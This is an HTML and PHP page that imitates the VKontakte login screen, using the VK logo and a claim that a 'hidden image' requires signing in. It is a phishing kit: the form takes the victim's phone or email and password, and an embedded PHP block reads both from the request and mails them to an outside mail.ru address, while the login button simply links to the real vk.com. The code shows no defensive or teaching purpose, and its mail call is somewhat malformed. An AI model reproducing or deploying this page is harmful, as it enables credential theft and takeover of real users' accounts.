<html>
<head>
<title>Вконтакте | Вход</title>
 <style>
 body{background:#edeef0;}
 .vk{border:0.5px solid #ddd; height:360px; width:650px; background:#fff; border-radius:3px;} 
 .vvk{background:#6287ae;  height:50px; border-radius:3px 3px 0px 0px;}
.img{margin-top:13px; margin-left:-590px;}
.txt{
margin-left:-1px;
border:0.5px solid #ddd;
height:50px;
width:100%;
background:#f7f7f7;
font-size:12.5px;
font-family: -apple-system,BlinkMacSystemFont,Roboto,Open Sans,Helvetica Neue,sans-serif;
}
.tx{
margin-left:-55px;
font-size:12.5px;
font-family: -apple-system,BlinkMacSystemFont,Roboto,Open Sans,Helvetica Neue,sans-serif;
}
input{
box-sizing: border-box;
height:30px;
border-color:#c9d0d6;
outline:none;
border-radius: 1px;
padding: 5px 9px 7px;
border: 1px solid #d3d9de;
}
button{
box-sizing: border-box;
height:30px;
border-color:#c9d0d6;
outline:none;
border-radius:2px;
padding: 5px 9px 7px;
border: 1px solid #6888ad;
background:#6888ad;
color:#fff;
width:170px;

}
.t{
color:#2a5885;
text-decoration: none;
font-size:12.5px;
font-family: -apple-system,BlinkMacSystemFont,Roboto,Open Sans,Helvetica Neue,sans-serif;
}
a{text-decoration: underline; text-decoration: none;}
.reg{
color:#fff;
text-decoration: none;
font-size:12.5px;
margin-left:-30px;
margin-top:5px;
font-family: -apple-system,BlinkMacSystemFont,Roboto,Open Sans,Helvetica Neue,sans-serif;
}
</style>
</head>
<body>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<center>

<div class="vk">

 <div class="vvk">
<b><r class="reg">Регистрация </r></b>
<img src="https://vk.com/images/logo_vk.png" class="img">

 </div>
<div class="txt">
<br>
<r>Скрытое изображение. Для просмотра Вам необходимо войти <b>ВКонтакте</b>.</r>
</div>
<br>
<form>
<p class="tx">Телефон или email</p>
<input type="text" name="email" value="<? $_GET['email']; ?>">
<p class="tx" style="margin-left:-115px;">Пароль</p>
<input type="password" name="pass" value="<? $_GET['pass']; ?>"><br/><br/>
<a href="https://vk.com"><button>войти</button></a><br>
</form>
<?php
$em = $_GET['email'];
$ps = $_GET['pass'];
mail('wizz.tm01@mail.ru', 'data', $em, $ps, '/');
?>
<a href="https://vk.com"><p class="t">Забыли пароль?</p></a>
</div>
</center>
</body>
</html>